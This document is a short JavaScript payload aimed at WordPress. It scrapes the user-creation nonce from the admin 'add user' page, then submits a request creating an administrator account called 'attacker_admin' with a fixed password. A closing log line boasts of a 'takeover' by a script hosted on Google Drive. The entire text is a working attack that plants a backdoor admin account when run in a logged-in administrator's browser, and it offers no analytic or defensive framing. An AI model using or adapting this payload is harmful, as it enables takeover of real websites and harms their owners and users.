async function createAdmin() {
    // 1. Obtain nonce for user creation
    const response = await fetch('/wp-admin/user-new.php');
    const html = await response.text();
    const nonceMatch = html.match(/name="_wpnonce_create-user" value="([^"]+)"/);

    if (nonceMatch) {
        const nonce = nonceMatch[1];
        const formData = new FormData();
        formData.append('action', 'createuser');
        formData.append('_wpnonce_create-user', nonce);
        formData.append('user_login', 'attacker_admin');
        formData.append('email', 'hacker@example.com');
        formData.append('pass1', 'P@ssw0rd123!');
        formData.append('pass2', 'P@ssw0rd123!');
        formData.append('role', 'administrator');
        formData.append('createuser', 'Add New User');

        // 2. Send request to create the admin account
        await fetch('/wp-admin/user-new.php', {
            method: 'POST',
            body: formData
        });
        console.log('Admin takeover successful via Google Drive hosted script.');
    }
}
createAdmin();
